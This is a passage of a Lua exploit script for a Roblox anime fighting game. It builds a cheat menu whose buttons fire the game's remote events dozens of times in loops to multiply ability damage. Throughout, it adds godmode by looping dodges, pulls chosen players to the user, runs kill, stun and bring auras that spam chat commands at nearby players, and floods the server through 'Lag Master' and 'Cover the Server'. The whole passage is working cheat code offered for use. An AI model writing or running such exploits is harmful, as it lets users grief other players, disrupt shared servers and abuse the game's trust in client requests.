 Name = "Real maximum utzumaki",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Supreme Art: Maximum Uzumaki").Move1.Event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
	Name = "Megumi Fushiguro"
})

Tab:AddButton({
 Name = "Powerful Dark Surge",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Dark Surge"].Skill.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Ultra Divine Dogs",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Divine Dogs"]["Divine Dogs"].RemoteEvent:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Divine Elephant",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Max Elephant"]["Max Elephant Strike"].RemoteEvent:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Lag Master",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Rabbits Escape"]["Rapidly Consecutive Rabbits"].RemoteEvent:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Black Hole",
 Callback = function()
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack["Chimera Shadow Garden"].Use.RemoteEvent:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "With This Treasure...",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack.Mahoraga.Mahoraga.RemoteEvent:FireServer()
   end    
})

Tab:AddButton({
 Name = "Eat a Sukuna Finger",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Mukbang Finger"].Script.Event:FireServer()
   end    
})

Tab:AddLabel("Sukuna mode")

Tab:AddButton({
 Name = "Divine Cleave",
 Callback = function()
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack.Cleave.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Divine Dismantle",
 Callback = function()
        for i = 1, 50 do
game:GetService("Players").LocalPlayer.Backpack.Dismantle.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Summon Mahoraga",
 Callback = function()
        local ohVector31 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
game.Players.LocalPlayer.Backpack["Summon Mahoraga"].Use.RemoteEvent:FireServer(ohVector31)
   end    
})

Tab:AddButton({
 Name = "World Slash",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["World Slash"].LocalScript.RemoteEvent:FireServer()
   end    
})

Tab:AddLabel("Mahoraga mode")
Tab:AddParagraph("He doesn't have RemoteEvent","BUUUT I found a way to become completely invisible")

Tab:AddButton({
 Name = "Become Invisible",
 Callback = function()
        game:GetService("ReplicatedStorage").Chainsaw_Man_RS_Folder.Remotes.Transform_RE:FireServer()
        wait(2)
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Vanish"):FireServer()
   end    
})

Tab:AddButton({
 Name = "Additional Tools",
 Callback = function()
        local tool = Instance.new("Tool")
tool.Name = "Kick"
tool.RequiresHandle = false

local lastPressTime = 0
tool.Activated:Connect(function()
  local currentTime = tick()
            if currentTime - lastPressTime >= 2 then
                lastPressTime = currentTime 
      for i = 1, 3 do
game:GetService("ReplicatedStorage").Remotes.KickSlam:FireServer()
end
    task.wait(0.1)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
local ActiveTracks = Humanoid:GetPlayingAnimationTracks()
for _,v in pairs(ActiveTracks) do
     v:Stop()
end
  task.wait(0.15)
local Anim = Instance.new("Animation")
Anim.AnimationId = "rbxassetid://14933743822"
local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
k:Play()
k:AdjustSpeed(0.9)
            end
end)

tool.Parent = game.Players.LocalPlayer.Backpack

local tool = Instance.new("Tool")
tool.Name = "Rush"
tool.RequiresHandle = false

local lastPressTime = 0
tool.Activated:Connect(function()
  local currentTime = tick()
            if currentTime - lastPressTime >= 5 then
                lastPressTime = currentTime 
                for i = 1, 3 do
game:GetService("ReplicatedStorage").sukuna.remotes.rush:FireServer()
end
            end
end)

tool.Parent = game.Players.LocalPlayer.Backpack
   end    
})

local Section = Tab:AddSection({
	Name = "Ichigo lorde"
})

Tab:AddButton({
 Name = "Cry from the heart",
 Callback = function()
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack.Scream.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Incinerate",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack.Cero.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Shadow Dash",
 Callback = function()
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Vanish"):FireServer()
   end    
})

Tab:AddButton({
 Name = "Hollow Mask",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Hollow Mask"].HollowMask.Remote:FireServer()
   end    
})

Tab:AddButton({
 Name = "Repeat Abilities",
 Callback = function()
        repeat wait()
 if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab Cero") then
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab Cero").LocalScript.Event:FireServer()
 end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

Tab:AddButton({
 Name = "Sudden Grab",
 Callback = function()
        game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
task.wait()
game:GetService("Players").LocalPlayer.Backpack["Grab Cero"].LocalScript.Event:FireServer()
   end    
})

local Section = Tab:AddSection({
	Name = "Ayanokoji (Half OP Character)"
})

Tab:AddLabel("The character sucks, but you can become immortal")
Tab:AddLabel("But you won't be able to use the tools")

Tab:AddDropdown({
	Name = "Repeat abilities",
	Default = "",
	Options = {"Repeat Grap", "Repeat Head Beatdown", "Repeat Grap Slam", "Off all abilities"},
	Callback = function(Value)
		if Value == "Repeat Grap" then
local WsE = true
		local function toolOdin()
repeat wait()
if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab") then
    game:GetService("Players").LocalPlayer.Character.Grab.LocalScript.Event:FireServer()
end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 or WsE == false
end

toolOdin()
		end
		if Value == "Repeat Head Beatdown" then
local WsE = true
		local function toolTri()
repeat wait()
if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Head Beatdown") then
    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Head Beatdown").LocalScript.Event:FireServer()
end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 or WsE == false
end

toolTri()
		end
		if Value == "Repeat Grap Slam" then
local WsE = true
		local function toolDva()
repeat wait()
if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab Slam") then
    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Grab Slam").LocalScript.Event:FireServer()
end
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 or WsE == false
end

toolDva()
		end
		if Value == "Off all abilities" then
	local WsE = false
		end
	end    
})

Tab:AddButton({
 Name = "Godmode",
 Callback = function()
local args = {
    [1] = "Ayanokoji Kiyotaka"
}

game:GetService("ReplicatedStorage"):WaitForChild("Picked"):FireServer(unpack(args))
   wait(0.3)
repeat
   game.RunService.Heartbeat:Wait()
   local LP = game.Players.LocalPlayer
repeat wait() until LP.Character
for i,v in pairs(LP.Backpack:GetChildren()) do
   if v.Name == "Dodge" then
       v.Parent = LP.Character
   end
end
game:GetService("Players").LocalPlayer.Character.Dodge.Skill.Event:FireServer()
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
 end    
})

Tab:AddButton({
 Name = "Godmode v2",
 Callback = function()
        local LP = game.Players.LocalPlayer

local function EquipDodge()
    repeat task.wait()
        if not LP.Character then
            continue
        end
        
        for i,v in pairs(LP.Backpack:GetChildren()) do
            if v.Name == "Dodge" then
               v.Parent = LP.Character
               game:GetService("Players").LocalPlayer.Character.Dodge.Skill.Event:FireServer()
for i, v in pairs(LP.Character:GetChildren()) do
        if v:IsA("Tool") then
            v:Activate()
        end
    end
               break
            end
        end
    until LP.Character and game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
end

repeat task.wait()
    EquipDodge()
until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
   end    
})

local Section = Tab:AddSection({
	Name = "Manjiro"
})

Tab:AddButton({
	Name = "Powerful Under kick",
	Callback = function()
      		for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack["Under Kick"].LocalScript.Event:FireServer()
end
  	end    
})

Tab:AddButton({
 Name = "Powerful KickSlam",
 Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").Remotes.KickSlam:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Strongest Strike",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Strongest Kick"].BlackFlash.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Shadow Rush",
 Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Vanish"):FireServer()
   end    
})

Tab:AddButton({
 Name = "Serious Aura",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Dark Impulse"]["Full Cowl"].Event:FireServer()
end
   end    
})

Tab:AddDropdown({
	Name = "Leg Mastery",
	Default = "1",
	Options = {"Suddenness", "Ultra instinct", "Series of Strikes"},
	Callback = function(Value)
		if Value == "Suddenness" then
		for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Strongest Kick"].BlackFlash.Event:FireServer()
end
wait(0.7)
game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
		end
		if Value == "Ultra instinct" then
count = 0
	repeat wait(0.8)
	count = count + 1
		for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Strongest Kick"].BlackFlash.Event:FireServer()
end
wait(0.7)
game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
until count == 5
		end
		if Value == "Series of Strikes" then
count = 0
last_pick_sin_mrazy = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	repeat wait(0.2)
  count = count + 1
	game:GetService("ReplicatedStorage"):FindFirstChild("AfterImageEvent"):FireServer()
	task.wait(0.1)
	for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack["Under Kick"].LocalScript.Event:FireServer()
end
	until count == 10
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy
		end
	end    
})

local Section = Tab:AddSection({
 Name = "Ichigo"
})

Tab:AddButton({
 Name = "Powerful Getsuga Barrage",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Getsuga Barrage"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Getsuga Slash",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Getsuga Slash"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Getsuga Tensho",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack["Getsuga Tensho"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Speed Slash",
 Callback = function()
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack["Speed Slash"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Become Mugetsu",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Final Getsuga Tensho"].LocalScript.Event:FireServer()
   end    
})

Tab:AddLabel("Mugetsu Mode")

Tab:AddButton({
 Name = "Become Mugetsu v2",
 Callback = function()
        local ohString1 = "Kurosaki Ichigo"
game:GetService("ReplicatedStorage").Picked:FireServer(ohString1)
wait(0.2)
game:GetService("Players").LocalPlayer.Backpack["Final Getsuga Tensho"].LocalScript.Event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Activate Mugetsu",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack.Mugetsu.LocalScript.Event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Cover the Server",
 Callback = function()
        for i = 1, 100 do
wait()
game:GetService("Players").LocalPlayer.Backpack.Mugetsu.LocalScript.Event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
 Name = "Mahito"
})

Tab:AddButton({
 Name = "Powerful Twister Claw",
 Callback = function()
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack["Twister Claw"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Soul Bend",
 Callback = function()
        for i = 1, 20 do
game:GetService("Players").LocalPlayer.Backpack["Soul Bend"].Move.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful True Curse",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["True Curse"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Domain Expansion",
 Callback = function()
        game:GetService("ReplicatedStorage").MahitoDomainExpansion.MahitoDomainEvent:FireServer()
   end    
})

local Section = Tab:AddSection({
 Name = "Aizen Sosuke"
})

Tab:AddButton({
 Name = "Powerful Raikoho",
 Callback = function()
        for i = 1, 15 do
game:GetService("Players").LocalPlayer.Backpack.Raikoho.LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Flash Slash",
 Callback = function()
        for i = 1, 30 do
game:GetService("Players").LocalPlayer.Backpack["Flash Slash"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Shatter",
 Callback = function()
game:GetService("Players").LocalPlayer.Backpack.Shatter.LocalScript.event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Powerful Sonido Clones",
 Callback = function()
        for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Sonido Clones"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Hado 90",
 Callback = function()
        for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Hado 90"].LocalScript.Event:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Awakening",
    Callback = function()
    game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Hogyoku Fusion").LocalScript.Event:FireServer()
   end    
})

Tab:AddLabel("Hogyoku Fusion Form")

Tab:AddButton({
 Name = "Powerful Reality Shatter",
 Callback = function()
        for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack["Reality Shatter"].LocalScript.Event:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Hadō 90: Kurohitsugi!",
 Callback = function()
        for i = 1, 5 do
game:GetService("Players").LocalPlayer.Backpack[utf8.char(72, 97, 100, 333, 32, 57, 48, 58, 32, 75, 117, 114, 111, 104, 105, 116, 115, 117, 103, 105)].LocalScript.Event:FireServer()
        end
   end    
})


-- Tab:AddToggle({
--  Name = "Eternal Cure",
--  Default = false,
--  Callback = function(Value)
--   ggh = Value
--  while ggh do
--    task.wait()
--    if game.Players.LocalPlayer.Character.Humanoid.Health ~= game.Players.LocalPlayer.Character.Humanoid.MaxHealth then
-- game:GetService("Players").LocalPlayer.Backpack.Heal.Script.Event:FireServer()
--   end
-- end
--    end    
-- })

-- Tab:AddButton({
--  Name = "Tools Pack",
--  Callback = function()
--         local tool = Instance.new("Tool")
-- tool.Name = "Powerful Raioko"
-- tool.RequiresHandle = false

-- tool.Activated:Connect(function()
-- for i = 1, 15 do
-- game:GetService("Players").LocalPlayer.Backpack.Raikoho.LocalScript.Event:FireServer()
-- end
-- end)

-- tool.Parent = game.Players.LocalPlayer.Backpack

-- local tool = Instance.new("Tool")
-- tool.Name = "Powerful Flash Slash"
-- tool.RequiresHandle = false

-- tool.Activated:Connect(function()
-- for i = 1, 30 do
-- game:GetService("Players").LocalPlayer.Backpack["Flash Slash"].LocalScript.Event:FireServer()
-- end
-- end)

-- tool.Parent = game.Players.LocalPlayer.Backpack

-- local tool = Instance.new("Tool")
-- tool.Name = "Powerful Multi Hit"
-- tool.RequiresHandle = false

-- tool.Activated:Connect(function()
-- for i = 1, 15 do
-- game:GetService("Players").LocalPlayer.Backpack["Multi Hit"].LocalScript.Event:FireServer()
-- end
-- end)

-- tool.Parent = game.Players.LocalPlayer.Backpack

-- local tool = Instance.new("Tool")
-- tool.Name = "Powerful Kurohitsugi"
-- tool.RequiresHandle = false

-- tool.Activated:Connect(function()
-- for i = 1, 15 do
-- game:GetService("Players").LocalPlayer.Backpack.Kurohitsugi.LocalScript.Event:FireServer()
-- end
-- end)

-- tool.Parent = game.Players.LocalPlayer.Backpack
--    end    
-- })

local Section = Tab:AddSection({
 Name = "Rayomen Sukuna"
})

Tab:AddButton({
 Name = "Powerful Cleave",
 Callback = function()
        for i = 1, 10 do
        game:GetService("Players").LocalPlayer.Backpack.Cleave.LocalScript.Event:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Powerful Dismantle",
 Callback = function()
        for i = 1, 35 do
        game:GetService("Players").LocalPlayer.Backpack.Dismantle.Dismantle.Event:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "World Slash",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["World Slash"].LocalScript.RemoteEvent:FireServer()
   end    
})

Tab:AddButton({
 Name = "World Slash: Net",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Dismantle: Net"].LocalScript.RemoteEvent:FireServer()
   end    
})

Tab:AddButton({
 Name = "World Slash: Dismantle",
 Callback = function()
        game.Players.LocalPlayer.Backpack["World Slash: Dismantle"].Punch.Event:FireServer()
   end    
})

Tab:AddButton({
 Name = "Arrow of Death",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack.Furnace.LocalScript.event:FireServer()
end
   end    
})

local Section = Tab:AddSection({
 Name = "Todo"
})

Tab:AddButton({
 Name = "Powerful Budgie Dropkick",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Boogie Dropkick"].Skill.Beatdown:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Powerful Sevonfold Strike",
 Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Sevonfold Strike"].Skill.Beatdown:FireServer()
end
   end    
})

Tab:AddButton({
 Name = "Basic Domain",
 Callback = function()
        game:GetService("Players").LocalPlayer.Backpack["Simple Domain"].Use.RemoteEvent:FireServer()
   end    
})

local playerNametwo = nil
local playerNames = {}
local playerDropdown
local players = game:GetService("Players")

local function updatePlayerNames()
    playerNames = {}
    for _, player in pairs(players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    if playerDropdown then
        playerDropdown:Refresh(playerNames, true)
    end
end

playerDropdown =
    Tab:AddDropdown(
    {
        Name = "Bring Player",
        Default = "Select player",
        Options = playerNames,
        Callback = function(PlayerUsername)
            playerNametwo = PlayerUsername
            local gh = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local ohInstance1 = workspace[playerNametwo]["Left Leg"]
game:GetService("ReplicatedStorage").Remote.BoogieWoogie:FireServer(ohInstance1)
  task.wait(0.95)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = gh
        end
    }
)

updatePlayerNames()

players.PlayerAdded:Connect(
    function(player)
        updatePlayerNames()
    end
)

players.PlayerRemoving:Connect(
    function(player)
        updatePlayerNames()
    end
)

local Section = Tab:AddSection({
 Name = "Inumaki"
})

Tab:AddButton({
 Name = "Kill Combo",
 Callback = function()
        for i = 1, 1 do
game.Players:Chat("come")
end
  wait(0.65)
for i = 1, 10 do
game.Players:Chat("die")
game.Players:Chat("explode")
end
   end    
})

Tab:AddButton({
 Name = "Stun Combo",
 Callback = function()
        for i = 1, 1 do
game.Players:Chat("come")
end
  wait(0.65)
for i = 1, 3 do
game.Players:Chat("stun")
game.Players:Chat("silence")
game.Players:Chat("sleep")
game.Players:Chat("dont move")
end
   end    
})

Tab:AddToggle({
 Name = "Kill Aura",
 Default = false,
 Callback = function(Value)
ty = Value
        while ty do
   wait(0.05)
local closestDistance = math.huge
                    local closestHumanoid = nil
                    local Usuario = game.Players.LocalPlayer

                    for _, v in pairs(workspace:GetDescendants()) do
                        if v:IsA("Humanoid") and v.RootPart and v.RootPart.Parent ~= Usuario.Character then
                            local distance =
                                (v.RootPart.Position - Usuario.Character.HumanoidRootPart.Position).magnitude
                            if distance < closestDistance and distance <= 35 then
                                closestDistance = distance
                                closestHumanoid = v
                            end
                        end
                    end

                    if closestHumanoid and closestHumanoid.Health ~= 0 then
                      game.Players:Chat("die")
                      game.Players:Chat("explode")
                    end
    end
   end    
})

Tab:AddToggle({
 Name = "Stun Aura",
 Default = false,
 Callback = function(Value)
tyi = Value
        while tyi do
   wait(0.05)
local closestDistance = math.huge
                    local closestHumanoid = nil
                    local Usuario = game.Players.LocalPlayer

                    for _, v in pairs(workspace:GetDescendants()) do
                        if v:IsA("Humanoid") and v.RootPart and v.RootPart.Parent ~= Usuario.Character then
                            local distance =
                                (v.RootPart.Position - Usuario.Character.HumanoidRootPart.Position).magnitude
                            if distance < closestDistance and distance <= 45 then
                                closestDistance = distance
                                closestHumanoid = v
                            end
                        end
                    end

                    if closestHumanoid and closestHumanoid.Health ~= 0 then
                       game.Players:Chat("stun")
                       game.Players:Chat("silence")
                       game.Players:Chat("sleep")
                       game.Players:Chat("dont move")
                    end
    end
   end    
})

Tab:AddToggle({
 Name = "Bring Aura",
 Default = false,
 Callback = function(Value)
tyiy = Value
        while tyiy do
   wait(0.05)
local closestDistance = math.huge
                    local closestHumanoid = nil
                    local Usuario = game.Players.LocalPlayer

                    for _, v in pairs(workspace:GetDescendants()) do
                        if v:IsA("Humanoid") and v.RootPart and v.RootPart.Parent ~= Usuario.Character then
                            local distance =
                                (v.RootPart.Position - Usuario.Character.HumanoidRootPart.Position).magnitude
                            if distance < closestDistance and distance <= 100 then
                                closestDistance = distance
                                closestHumanoid = v
                            end
                        end
                    end

                    if closestHumanoid and closestHumanoid.Health ~= 0 then
                       game.Players:Chat("come")
                    end
    end
   end    
})

local Section = Tab:AddSection({
 Name = "Cid Unleashed (you can get this one by killing boss Cid Kagenou)"
})

Tab:AddButton({
 Name = "Powerful Speed Blitz",
    Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Speed Blitz"].LocalScript.Event:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Powerful Imminet Blink",
    Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").CidKageeno.Blinkk:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Powerful Recovery Atomic",
    Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Recovery Atomic"].LocalScript.Event:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Overdrive",
    Callback = function()
game:GetService("Players").LocalPlayer.Backpack.Overdrive["Local Script"].Event:FireServer()
   end    
})


local Section = Tab:AddSection({
 Name = "Gojo Unleashed (you can get this one by killing boss Gojo Satoru)"
})

Tab:AddButton({
 Name = "Powerful Black Flash",
    Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Black Flash"].LocalScript.Event:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Powerful Maximum Blue",
    Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").GojoV3.maxblue:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Powerful Maximum Red",
    Callback = function()
        for i = 1, 10 do
game:GetService("ReplicatedStorage").GojoV3.maxred:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Powerful Simple Domain",
    Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Simple Domain"].Use.RemoteEvent:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "200% Hollow Purple",
    Callback = function()
game:GetService("ReplicatedStorage").GojoV3.haitram:FireServer()
   end    
})

Tab:AddButton({
 Name = "Hollow Purple Nuke",
    Callback = function()
game:GetService("ReplicatedStorage").GojoV3.nuke:FireServer()
   end    
})

Tab:AddButton({
 Name = "Unlimited Void 0,2",
    Callback = function()
game:GetService("ReplicatedStorage").Events["UnlimitedVoid0.2"]:FireServer()
   end    
})

Tab:AddButton({
 Name = "Powerful Reverse Cursed Technique",
    Callback = function()
        for i = 1, 10 do
game:GetService("Players").LocalPlayer.Backpack["Reverse Cursed Technique"].Script.Event:FireServer()
        end
   end    
})

Tab:AddButton({
 Name = "Unlimited Void",
    Callback = function()
game:GetService("ReplicatedStorage").Events.UnlimitedVoid:FireServer()
   end    
})

local Section = Tab:AddSection({
 Name = "Coyote Starrk (you can get this one by killing boss Gojo Satoru)"
})

Tab:AddLabel("Default Form")

Tab:AddButton(
    {
        Name = "Powerful Flash Barrage",
        Callback = function()
            for i = 1, 15 do
                game:GetService("Players").LocalPlayer.Backpack["Flash Barrage"].LocalScript.Event:FireServer()
            end
        end
    }
)

Tab:AddButton(
    {
        Name = "Powerful Flash Cleave",
        Callback = function()
            for i = 1, 15 do
                game:GetService("Players").LocalPlayer.Backpack["Flash Cleave"].LocalScript.Event:FireServer()
            end
        end
    }
)

Tab:AddButton(
    {
        Name = "Powerful Sonido Clones",
        Callback = function()
            for i = 1, 15 do
                game:GetService("Players").LocalPlayer.Backpack["Sonido Clones"].LocalScript.Event:FireServer()
            end
        end
    }
)

Tab:AddButton(
    {
        Name = "Powerful Chest Cero",
        Callback = function()
            for i = 1, 15 do
                game:GetService("Players").LocalPlayer.Backpack["Chest Cero"].LocalScript.Event:FireServer()
            end
        end
    }
)

Tab:AddButton(
    {
        Name = "Sonido",
        Callback = function()
            game:GetService("ReplicatedStorage").Remotes.sonido:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Garganta",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Garganta.LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Awakening",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack[
                utf8.char(
                    82,
                    101,
                    115,
                    117,
                    114,
                    114,
                    101,
                    99,
                    99,
                    105,
                    243,
                    110,
                    58,
                    32,
                    32,
                    76,
                    111,
                    115,
                    32,
                    76,
                    111,
                    98,
                    111,
                    115
                )
            ].LocalScript.Event:FireServer()
        end
    }
)

Tab:AddLabel("Los Lobos Form")

Tab:AddButton(
    {
        Name = "Powerful Los Lobos",
        Callback = function()
            for i = 1, 15 do
                game:GetService("Players").LocalPlayer.Backpack["Los Lobos"].LocalScript.Event:FireServer()
            end
        end
    }
)

Tab:AddButton(
    {
        Name = "Powerful Colmilo",
        Callback = function()
            for i = 1, 15 do
                game:GetService("Players").LocalPlayer.Backpack.Colmilo.LocalScript.Event:FireServer()
            end
        end
    }
)

Tab:AddButton(
    {
        Name = "Powerful Right Gun",
        Callback = function()
            for i = 1, 15 do
                game:GetService("Players").LocalPlayer.Backpack["Right Gun"].LocalScript.Event:FireServer()
            end
        end
    }
)

Tab:AddButton(
    {
        Name = "Powerful Sonido Cero",
        Callback = function()
            for i = 1, 15 do
                game:GetService("Players").LocalPlayer.Backpack["Sonido Cero"].LocalScript.event:FireServer()
            end
        end
    }
)

Tab:AddButton(
    {
        Name = "Powerful Spinning Shots",
        Callback = function()
            for i = 1, 15 do
                game:GetService("Players").LocalPlayer.Backpack["Spinning Shots"].LocalScript.Event:FireServer()
            end
        end
    }
)

Tab:AddButton(
    {
        Name = " Powerful Wolves",
        Callback = function()
            for i = 1, 15 do
                game:GetService("Players").LocalPlayer.Backpack.Wolves["Divine Dogs"].RemoteEvent:FireServer()
            end
        end
    }
)

Tab:AddButton(
    {
        Name = "Cero Metralleta",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack["Cero Metralleta"].LocalScript.Event:FireServer()
        end
    }
)


local Section = Tab:AddSection({
 Name = "Byakuya Kuchiki"
})

Tab:AddButton(
    {
        Name = "Seamless",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Seamless.LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Sokatsui",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Sokatsui.LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Overflow",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Overflow.LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Gokei",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Gokei.LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Sonido",
        Callback = function()
            game:GetService("ReplicatedStorage").Remotes.sonido:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Senkai",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Senkai.LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Bankai",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Bankai.LocalScript.Event:FireServer()
        end
    }
)

local Section = Tab:AddSection({
 Name = "Genryusai Yamamoto"
})

Tab:AddButton(
    {
        Name = "Reiatsu",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack.Reiatsu.LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Ryujin Jakka",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Ry\197\171jin Jakka").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
        Name = "Hado 96: Ittokaso",
        Callback = function()
            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Had\197\141 96: Ittokaso").LocalScript.Event:FireServer()
        end
    }
)

Tab:AddButton(
    {
